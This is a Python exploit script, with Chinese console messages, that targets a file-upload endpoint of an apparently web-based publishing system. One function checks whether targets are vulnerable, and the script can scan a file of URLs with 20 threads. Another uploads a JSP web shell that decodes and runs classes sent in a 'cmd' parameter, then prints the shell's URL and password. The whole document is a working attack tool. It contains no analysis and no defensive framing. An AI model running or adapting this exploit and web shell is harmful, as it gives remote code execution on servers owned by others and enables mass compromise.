import re,requests,argparse,time,sys,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
    "Content-Length": "804",
    "Content-Type": "multipart/form-data; boundary=dd8f988919484abab3816881c55272a7",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "close",
    }

def exp(url):
    print("漏洞利用>>>>>>>>>>>getshell")
    time.sleep(1)
    ss = ''.join((
    "--dd8f988919484abab3816881c55272a7",
    "\r\n",
    'Content-Disposition: form-data; name="Filedata"; filename="Test.jsp"',
    "\r\n\r\n",
    '''
<%!
class ARRAY extends ClassLoader{
  ARRAY(ClassLoader c){super(c);}
  public Class disk(byte[] b){
    return super.defineClass(b, 0, b.length);
  }
}
public byte[] declaring(String str) throws Exception {
  Class base64;
  byte[] value = null;
  try {
    base64=Class.forName("sun.misc.BASE64Decoder");
    Object decoder = base64.newInstance();
    value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
  } catch (Exception e) {
    try {
      base64=Class.forName("java.util.Base64");
      Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
      value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
    } catch (Exception ee) {}
  }
  return value;
}
%>
<%
String cls = request.getParameter("cmd");
if (cls != null) {
  new ARRAY(this.getClass().getClassLoader()).disk(declaring(cls)).newInstance().equals(new Object[]{request,response});
}
%>
''',
    "\r\n",
    "--dd8f988919484abab3816881c55272a7",
    "\r\n",
    'Content-Disposition: form-data; name="Submit"',
    "\r\n\r\n",
    "submit",
    "\r\n",
    "--dd8f988919484abab3816881c55272a7--"
    ))
    payload = '/publishing/publishing/material/file/video'
    target = url+payload
    rsp2 = requests.post(url=target,headers=headers,data=ss,verify=False).text
    rsp2 = json.loads(rsp2)
    if rsp2['errMsg']=='success!' and rsp2['success']==True:
        shell_url = url+"/publishingImg/"+rsp2["data"]["path"]
        print(f"[+]{shell_url}\n[+]密码：cmd")

def poc(url):
    payload = '/publishing/publishing/material/file/video'
    target = url+payload
    s = ''.join((
    "--dd8f988919484abab3816881c55272a7",
    "\r\n",
    'Content-Disposition: form-data; name="Filedata"; filename="Test.jsp"',
    "\r\n\r\n",
    "Test",
    "\r\n",
    "--dd8f988919484abab3816881c55272a7",
    "\r\n",
    'Content-Disposition: form-data; name="Submit"',
    "\r\n\r\n",
    "submit",
    "\r\n",
    "--dd8f988919484abab3816881c55272a7--"
    ))
    try: 
        rsp2 = requests.post(url=target,headers=headers,data=s,verify=False).text
        rsp2 = json.loads(rsp2)
        if rsp2['errMsg']=='success!' and rsp2['success']==True:
            print(f"[+]{url}存在文件上传漏洞")
            with open('./result.txt','a',encoding='utf-8') as f:
                f.write(url)
            return True
    except Exception as e:
        print("该站点有问题")
        return False
def main():
    par = argparse.ArgumentParser()
    par.add_argument('-u','--url',dest='url',type=str,help='http://www.qqqq.com')
    par.add_argument('-f','--file',dest='file',type=str,help='target.txt')
    args = par.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and  args.file:
        url_list = []
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(20)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
if __name__ == '__main__':
    main()